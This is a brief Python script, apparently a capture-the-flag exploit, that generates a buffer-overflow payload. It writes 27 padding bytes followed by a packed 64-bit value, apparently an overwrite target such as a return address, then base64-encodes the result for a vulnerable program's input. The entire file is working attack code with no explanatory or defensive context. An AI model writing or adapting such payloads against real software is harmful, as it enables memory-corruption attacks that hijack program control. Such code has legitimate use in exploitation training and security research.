
import sys
import struct
import base64

buf = b'UUUUUUUUUUUUUUUUUUUUUUUUUUU'
buf += struct.pack('<Q', 13989008933343875024)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
